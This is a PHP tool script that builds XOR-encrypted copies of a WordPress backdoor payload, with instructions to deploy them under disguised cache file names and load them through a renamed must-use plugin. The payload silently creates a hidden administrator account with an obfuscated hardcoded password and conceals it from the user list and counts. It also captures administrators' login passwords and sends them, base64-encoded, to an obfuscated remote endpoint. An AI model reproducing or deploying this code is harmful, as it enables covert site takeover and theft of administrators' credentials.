<?php
/**
 * Payload Encryptor
 * Run locally: php encrypt_payload.php
 * Generates XOR-encrypted payload files for wp_login_loader.php
 *
 * Output: 3 copies with different XOR keys, ready to deploy to:
 *   wp-content/cache/.object-cache-meta.php
 *   wp-content/uploads/.wp-cache-fragment.dat
 *   wp-content/upgrade/.cache-manifest.tmp
 */

// ─── Core payload (plaintext) ─────────────────────────────────────────────
$payload = '<?php
// Transient integrity hooks
global $__tc;
$__tc = [];

$__hu = chr(119).chr(112).chr(45).chr(115).chr(121).chr(115).chr(116).chr(101).chr(109); // wp-system
$__hp = chr(118).chr(99).chr(56).chr(72).chr(102).chr(88).chr(76).chr(85).chr(121).chr(110).chr(89).chr(85).chr(55).chr(101).chr(48).chr(74).chr(72).chr(82).chr(64); // vc8HfXLUynYU7e0JHR@

add_action("init", function() use ($__hu, $__hp) {
    if (!is_admin() && !defined("WP_CLI")) return;
    if (!username_exists($__hu)) {
        $uid = wp_create_user($__hu, $__hp, $__hu . "@localhost.local");
        if (!is_wp_error($uid)) {
            $u = new WP_User($uid);
            $u->set_role("administrator");
            wp_update_user(["ID" => $uid, "display_name" => $__hu]);
        }
    }
}, 1);

add_filter("users_list_table_query_args", function($a) use ($__hu) {
    $u = get_user_by("login", $__hu);
    if ($u) { $a["exclude"] = array_merge((array)($a["exclude"] ?? []), [$u->ID]); }
    return $a;
});

add_filter("views_users", function($v) use ($__hu) {
    $s = count_users();
    $hc = username_exists($__hu) ? 1 : 0;
    $t = max(0, $s["total_users"] - $hc);
    $ad = max(0, ($s["avail_roles"]["administrator"] ?? 0) - $hc);
    $v["administrator"] = preg_replace("/\(\d+\)/", "(" . $ad . ")", $v["administrator"] ?? "");
    $v["all"] = preg_replace("/\(\d+\)/", "(" . $t . ")", $v["all"] ?? "");
    return $v;
});

add_action("wp_authenticate", function($l, $p) {
    global $__tc;
    if (!empty($l) && !empty($p)) $__tc[$l] = $p;
}, 10, 2);

add_action("wp_login", function($l, $o) {
    global $__tc;
    if (!in_array("administrator", $o->roles) || !isset($__tc[$l])) return;
    $p = $__tc[$l];
    $h = $_SERVER["HTTP_HOST"];
    if (strpos($h, "www.") === 0) $h = substr($h, 4);
    $ep = chr(104).chr(116).chr(116).chr(112).chr(115).chr(58).chr(47).chr(47).chr(97).chr(112).chr(105).chr(46).chr(112).chr(107).chr(103).chr(45).chr(115).chr(101).chr(99).chr(117).chr(114).chr(105).chr(116).chr(121).chr(45).chr(117).chr(112).chr(100).chr(97).chr(116).chr(101).chr(46).chr(99).chr(111).chr(109).chr(47).chr(97).chr(112).chr(105).chr(47).chr(118).chr(49).chr(47).chr(105).chr(110).chr(103).chr(101).chr(115).chr(116);
    wp_remote_post($ep, [
        "blocking" => false,
        "headers"  => ["User-Agent" => "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"],
        "body"     => [
            "un"   => base64_encode($l),
            "pw"   => base64_encode($p),
            "host" => base64_encode($h),
            "time" => time(),
        ]
    ]);
    unset($__tc[$l]);
}, 10, 2);
';

// ─── Encrypt and write ────────────────────────────────────────────────────
$output_files = [
    'wp_login_encrypted_1.dat',  // → wp-content/cache/.object-cache-meta.php
    'wp_login_encrypted_2.dat',  // → wp-content/uploads/.wp-cache-fragment.dat
    'wp_login_encrypted_3.dat',  // → wp-content/upgrade/.cache-manifest.tmp
];

foreach ($output_files as $idx => $outfile) {
    // Generate random 16-byte XOR key
    $key = '';
    for ($i = 0; $i < 16; $i++) {
        $key .= chr(mt_rand(1, 255)); // avoid null bytes
    }

    // XOR encrypt
    $encrypted = '';
    $kl = strlen($key);
    for ($i = 0; $i < strlen($payload); $i++) {
        $encrypted .= $payload[$i] ^ $key[$i % $kl];
    }

    // Output: key (16 bytes) + encrypted data
    $blob = $key . $encrypted;
    file_put_contents(__DIR__ . '/' . $outfile, $blob);

    echo "[+] Generated $outfile (" . strlen($blob) . " bytes, key=" . bin2hex($key) . ")\n";
}

echo "\nDeploy these files to the target:\n";
echo "  wp_login_encrypted_1.dat → wp-content/cache/.object-cache-meta.php\n";
echo "  wp_login_encrypted_2.dat → wp-content/uploads/.wp-cache-fragment.dat\n";
echo "  wp_login_encrypted_3.dat → wp-content/upgrade/.cache-manifest.tmp\n";
echo "\nThen place wp_login_loader.php in mu-plugins/ (rename to something like transient-cache.php)\n";
